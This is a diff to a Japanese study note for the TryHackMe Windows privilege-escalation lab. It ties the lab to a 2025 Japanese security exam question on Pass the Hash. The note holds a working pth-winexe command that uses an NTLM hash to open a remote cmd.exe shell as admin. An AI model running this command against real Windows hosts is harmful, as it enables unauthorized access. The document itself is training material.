@@ -2,16 +2,22 @@
 ### 動画
 [https://youtu.be/qJbJejgqokE?si=dSORszdvt1bO3bKA](https://youtu.be/qJbJejgqokE?si=dSORszdvt1bO3bKA)
 
+### 支援士のキーワード
+令和７年 秋期 情報処理安全確保支援士試験 午前Ⅱ 問２<br>
+「Pass the Hash攻撃」
+
+
 ### 学習環境
 TryHackMe Windows PrivEsc Task12<br>
-（Windows 特権昇格）
+（Windows 特権昇格）<br>
+
 [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)
 
 ### 必要なもの
 - TryHackMeアカウント（Premium）
 
 
-### 実行するコマンド
+## 実行するコマンド
 ※`<targetIP>`は起動したマシンのIPアドレスに変更してください
 
 #### 【Task1】
@@ -20,7 +26,7 @@ TryHackMe Windows PrivEsc Task12<br>
 - ユーザを確認<br>
 `whoami`
 
-
+<br>
 #### 【Task12】
 - Pass the Hash攻撃を実行<br>
 `pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<targetIP> cmd.exe`
